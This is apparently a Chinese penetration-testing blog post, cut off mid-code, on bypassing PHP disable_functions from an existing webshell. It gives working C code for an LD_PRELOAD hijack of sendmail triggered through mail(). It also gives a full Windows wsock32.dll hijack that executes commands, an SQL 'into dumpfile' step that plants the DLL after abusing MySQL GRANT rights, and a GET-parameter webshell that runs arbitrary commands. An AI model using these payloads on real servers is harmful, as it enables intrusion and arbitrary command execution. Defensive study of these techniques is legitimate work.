+<h2 id="0x04-实战"><a href="#0x04-实战" class="headerlink" title="0x04 实战"></a>0x04 实战</h2><h2 id="一、利用环境变量LD-PRELOAD来绕过php-disable-function执行系统命令"><a href="#一、利用环境变量LD-PRELOAD来绕过php-disable-function执行系统命令" class="headerlink" title="一、利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令"></a>一、利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h3><p>在做渗透测试的时候如果遇到安全配置比较好的服务器，当你通过各种途径获得一个php类型的webshell后，却发现面对的是无法执行系统命令的尴尬，因为这类服务器针对命令执行函数做了防范措施，后续的渗透行为都因此而止步。笔者这里分享一个绕过思路，希望你能在实际测试中派上用场。</p>
+<h3 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2. 绕过思路"></a>2. 绕过思路</h3><p><strong>严苛环境下php设置的disable_function如下：</strong></p>
+<ul>
+<li>dl</li>
+<li>exec</li>
+<li>system</li>
+<li>passthru</li>
+<li>popen</li>
+<li>proc_open</li>
+<li>pcntl_exec</li>
+<li>shell_exec</li>
+</ul>
+<p>如果你遇到的设置中漏掉某些函数，那再好不过了，直接利用漏掉的函数绕过。但如果运气不太好，遇到这种所有能直接执行系统命令的函数都被禁用的情况，那真是欲哭无泪。想反弹一个cmdshell变成奢望。当然考虑到开发使用等影响因素，一般web环境不应完全禁用。</p>
+<p>笔者经过大量资料搜寻，发现在这种情况下还有几种执行系统命令的方法，例如通过/proc/self/mem 修改got来劫持库函数调用以及php反序列化内存破坏漏洞利用，但这些方法利用起来难度都较大，你得先搞清楚内存偏移地址等等知识点，并搭建相同的平台进行调试。而且一般来说安全配置还会严格限制用户的文件权限并设置open_basedir，你根本没有机会去读取mem等文件，很难利用成功。</p>
+<p>那么还有没有别的方法？putenv和mail函数给了我们希望，如果系统没有修补bash漏洞，利用网上已经给出的poc：<a href="http://www.exploit-db.com/exploits/35146/" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/35146/</a> 可以轻松绕过。</p>
+<p>这个poc大体思路是通过putenv来设置一个包含自定义函数的环境变量，通过mail函数来触发。为什么mail函数能触发，因为mail函数在执行过程中，php与系统命令执行函数有了交集，它调用了popen函数来执行，如果系统有bash漏洞，就直接触发了恶意代码的执行。但一般这种漏洞，安全意识好一点的运维，都会给打上补丁了。</p>
+<p>那么我们来继续挖掘一下它的思路，php的mail函数在执行过程中会默认调用系统程序<code>/usr/sbin/sendmail</code>，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的了。那么我们有没有办法在webshell层来劫持它呢，环境变量LD_PRELOAD给我们提供了一种简单实用的途径。</p>
+<h3 id="3-LD-PRELOAD-hack"><a href="#3-LD-PRELOAD-hack" class="headerlink" title="3. LD_PRELOAD hack"></a>3. LD_PRELOAD hack</h3><hr>
+<p>在UNIX的动态链接库的世界中，<code>LD_PRELOAD</code>是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。如果你想进一步了解这些知识，可以去网上搜索相关文章，这里不做过多解释，直接来看一段例程，就能明白利用原理。</p>
+<p>例程：verifypasswd.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> passwd[] = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage: %s &lt;password&gt;/n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Correct Password!/n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid Password!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序很简单，根据判断传入的字符串是否等于&quot;password&quot;，得出两种不同结果。 其中用到了标准C函数<code>strcmp</code>函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n"</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把它编译为一个动态共享库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">$ gcc -o verifypasswd.c verifypasswd</span><br><span class="line"></span><br><span class="line">$ gcc -shared verifypasswd -o hack.so</span><br></pre></td></tr></table></figure>
+
+<p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">$ <span class="built_in">export</span> LD_PRELOAD=<span class="string">"./hack.so"</span></span><br></pre></td></tr></table></figure>
+
+<p>运行给出的例程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">$ ./verifypasswd  abcd</span><br><span class="line"></span><br><span class="line">$ Correct Password!</span><br></pre></td></tr></table></figure>
+
+<p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p>
+<h3 id="4-实战测试"><a href="#4-实战测试" class="headerlink" title="4.实战测试"></a>4.实战测试</h3><hr>
+<p>那么我们来看一下sendmail函数都调用了哪些库函数，使用<code>readelf -Ws /usr/sbin/sendmail</code>命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">[yiyang@bogon Desktop]$ readelf -Ws /usr/sbin/sendmail</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 202 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 0000000000000238     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getegid@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND pcre_fullinfo</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcspn@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (3)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_tolower_loc@GLIBC_2.3 (3)</span><br><span class="line">     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getopt@GLIBC_2.2.5 (2)</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fork@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND db_version</span><br><span class="line">    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __environ@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strerror@GLIBC_2.2.5 (2)</span><br><span class="line">    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.2.5 (2)</span><br><span class="line">    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.2.5 (2)</span><br><span class="line">    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND seteuid@GLIBC_2.2.5 (2)</span><br><span class="line">    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strspn@GLIBC_2.2.5 (2)</span><br><span class="line">    19: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5 (2)</span><br><span class="line">    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>从中选取一个合适的库函数后我们就可以进行测试了：</p>
+<ol>
+<li>编制我们自己的动态链接程序。</li>
+<li>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。</li>
+<li>在webshell上用mail函数发送一封邮件来触发。</li>
+</ol>
+<p>我们来测试删除一个新建的文件，这里我们选取geteuid()函数来改造，先在/tmp目录新建一个文件check.txt。</p>
+<p>编写hack.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"rm /tmp/check.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是32位一个是64位）把它编译为一个位置信息无关的动态共享库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">$ gcc -c -fPIC hack.c -o hack</span><br><span class="line"></span><br><span class="line">$ gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>
+
+<p>再上传到webshell上，然后写一段简单的php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/hack.so"</span>);</span><br><span class="line">mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。 本地测试效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">[yiyang@bogon Desktop]$ touch /tmp/check.txt</span><br><span class="line">[yiyang@bogon bin]$ ./php mail.php</span><br><span class="line">sendmail: warning: the Postfix sendmail <span class="built_in">command</span> has <span class="built_in">set</span>-uid root file permissions</span><br><span class="line">sendmail: warning: or the <span class="built_in">command</span> is run from a <span class="built_in">set</span>-uid root process</span><br><span class="line">sendmail: warning: the Postfix sendmail <span class="built_in">command</span> must be installed without <span class="built_in">set</span>-uid root file permissions</span><br><span class="line">sendmail: fatal: setgroups(1, &amp;500): Operation not permitted</span><br><span class="line">[yiyang@bogon bin]$ cat /tmp/check.txt</span><br><span class="line">cat: /tmp/check.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>普通用户权限，目标文件被删除。</p>
+<h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><p>以上方法在<strong>Linux RHEL6及自带邮件服务+php5.3.X以下</strong>平台测试通过，精力有限未继续在其他平台测试，新版本可能进行了相应修复。这种绕过行为其实也很容易防御，禁用相关函数或者限制环境变量的传递，例如安全模式下，这种传递是不会成功的。这个思路不仅仅局限于mail函数，你可以尝试追踪其他函数的调用过程，例如syslog等与系统层有交集的函数是否也有类似调用动态共享库的行为来举一反三。</p>
+<h2 id="二、-利用mail-bypass-disable-function-执行命令"><a href="#二、-利用mail-bypass-disable-function-执行命令" class="headerlink" title="二、 利用mail bypass disable_function 执行命令"></a>二、 利用mail bypass disable_function 执行命令</h2><p>最近渗透过程中遇到一个站用了UPUPW_AP5.4来搭建，这个程序是自带了sendmail.exe的，以下是我本地复现的情况：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3ytbsxg4j2152024dg2.jpg" alt></p>
+<p>当时目标站的disable_function是exec,system,passthru,popen,shell_exec ,proc_open，另外目标站做了<code>open_basedir</code>限制，只能访问web目录下面的文件。</p>
+<p>在linux下面可以使用pcntl_exec，当然windows下面是没有加载这个扩展的。Google一番发现COM class加载wscript.shell也可以执行命令，然而一样的没有加载这个扩展。</p>
+<p>大家都知道在linux上可以用<code>mail</code>来<code>bypass disable_fucntion</code>来执行命令，因为linux有<code>LD_PRELOAD</code>这个环境变量可以很方便的注入进程。那么在windows上呢? 当然也是可以。</p>
+<p>但是默认情况下sendmail_path在windows中并没有设置，没有值的话是不行的。UPUPW很贴心的给了我们一个sendmail.exe</p>
+<p>Windows下面没有LD_PRELOAD怎么办呢?</p>
+<p>当然是DLL劫持!</p>
+<p>我们来看一下sendmail的导入表。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3yxyycr6j20k50aa3zr.jpg" alt></p>
+<p>找到一个不在knowndlls里面的dll，就是它了，<strong>wsock32.dll</strong>!<br>由于php的mail函数中的参数5是Additional parameters, 也就是说我们可以给sendmail程序加自定义的命令行！那么思路就是写一个dll解析命令行并且执行命令！</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3z13cwe3j20xk095t9e.jpg" alt></p>
+<p>Dll劫持的代码可以由一个小工具Aheadlib来生成，不过生成的代码是不能用的，会有一千多个错误，简单替换一下就能用了，加入自定义代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> argc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> **argv = CommandLineToArgvW(GetCommandLineW(), &amp;argc);</span><br><span class="line"><span class="keyword">wchar_t</span> *cmd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> *outfile = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (!lstrcmp(argv[i], <span class="string">L"-c"</span>))</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; argc)</span><br><span class="line">        &#123;</span><br><span class="line">                cmd = argv[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!lstrcmp(argv[i], <span class="string">L"-o"</span>))</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; argc)</span><br><span class="line">        &#123;</span><br><span class="line">                outfile = argv[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cmd &amp;&amp; outfile)</span><br><span class="line">&#123;</span><br><span class="line">        DWORD tmp = <span class="number">0</span>;</span><br><span class="line">        HANDLE h = CreateFile(outfile, GENERIC_WRITE, <span class="number">0</span>, <span class="number">0</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        SECURITY_ATTRIBUTES                sa;</span><br><span class="line">        HANDLE                                        hRead, hWrite;</span><br><span class="line">        byte                                        buf[<span class="number">40960</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        STARTUPINFOW                        si;</span><br><span class="line">        PROCESS_INFORMATION                pi;</span><br><span class="line">        DWORD                                        bytesRead;</span><br><span class="line">        RtlSecureZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">        RtlSecureZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">        RtlSecureZeroMemory(&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">        <span class="keyword">int</span> br = <span class="number">0</span>;</span><br><span class="line">        sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">        sa.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">        sa.bInheritHandle = TRUE;</span><br><span class="line">        <span class="keyword">if</span> (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                ExitProcess(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">        GetStartupInfoW(&amp;si);</span><br><span class="line">        si.hStdError = hWrite;</span><br><span class="line">        si.hStdOutput = hWrite;</span><br><span class="line">        si.wShowWindow = SW_HIDE;</span><br><span class="line">        si.lpDesktop = <span class="string">L"WinSta0\\Default"</span>;</span><br><span class="line">        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">        <span class="keyword">if</span> (!CreateProcessW(<span class="literal">NULL</span>, cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">        &#123;</span><br><span class="line">                CloseHandle(hWrite);</span><br><span class="line">                CloseHandle(hRead);</span><br><span class="line">                ExitProcess(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hWrite);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span> (!ReadFile(hRead, buf + br, <span class="number">4000</span>, &amp;bytesRead, <span class="literal">NULL</span>))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                br += bytesRead;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WriteFile(h, buf, br, &amp;tmp, <span class="number">0</span>);</span><br><span class="line">        CloseHandle(h);</span><br><span class="line">        CloseHandle(hRead);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码很简单，执行命令，保存文件，直接加入DllMain就行了。</p>
+<p>编译之后生成一个dll，需要把这个dll和原本的wsock32.dll放入sendmail的文件夹。</p>
+<p>那么问题来了，我们并没有读写sendmail程序文件夹的权限，怎么办呢。</p>
+<p>此时我突然发现php连接的mysql的账号虽然不是root，但是有grant权限。。。</p>
+<p>于是给自己grant了全部权限之后，我们就可以使用dumpfile的方式写入文件夹了，类似</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(‘xxxxxx’) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:\\UPUPW_AP5.4\\sendmail\\wsock32.dll'</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候你会问为什么不用udf呢？</p>
+<p>因为udf需要写入plugin目录，但是这个目录默认情况下不存在。</p>
+<p>你会说可以用$INDEX_ALLOCATION啊，但我在本机测试并不行，远程也不行，创建文件夹本地直接提示Access denied，但是却可以创建文件。另外我本地和远程都是NTFS。</p>
+<p>这里需要把自己编译的dll和原版wsock32.dll都写进去。</p>
+<p>最后使用如下php代码即可执行命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'-c whoami -o D:\\UPUPW_AP5.4\\htdocs\\1.txt'</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'1.txt'</span>);</span><br><span class="line">unlink(<span class="string">'1.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3z6hgejbj20a602yjra.jpg" alt></p>
+<h2 id="三、无-sendmail-环境下突破-disable-functions-执行命令"><a href="#三、无-sendmail-环境下突破-disable-functions-执行命令" class="headerlink" title="三、无 sendmail 环境下突破 disable_functions 执行命令"></a>三、无 sendmail 环境下突破 disable_functions 执行命令</h2><p>遇到用 disable_functions 指示器禁用了所有命令执行函数的站点，借助环境变量 LD_PRELOAD 劫持 /usr/sbin/sendmail 中的系统函数 getuid()，从而不借助 PHP 的各类命令执行函数（如 exec()、system()、dl() 等等）执行系统命令，屡试不爽。<br>最近实战中遇到一个站，同样无法执行命令</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zeu3wyyj20sb0f4ad4.jpg" alt></p>
+<p>disable_functions 禁用命令执行函数</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zfop9nbj20u9061jtn.jpg" alt></p>
+<p>同时，还禁用了 sendmail，导致之前的惯用法失效：</p>
+<p>琢磨了几天，找到一种不依赖 sendmail 的手法：GCC 支持 C 语言规范扩展 <strong>attribute</strong>((constructor))，让我可以劫持共享对象（或者说，拦劫加载共享对象这一动作），不用劫持某一具体函数，实现执行系统命令。</p>
+<p>开箱即用的 webshell 位于 <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithg ... func_via_LD_PRELOAD</a>，包括两个关键文件，bypass_disablefunc.php 和 bypass_disablefunc_x64.so。想法把他两上传至目标，访问<code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></p>
+<p>即可执行系统命令：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3zhfisppj20z9046di4.jpg" alt></p>
+<p>github: <code>yangyangwithgnu</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, 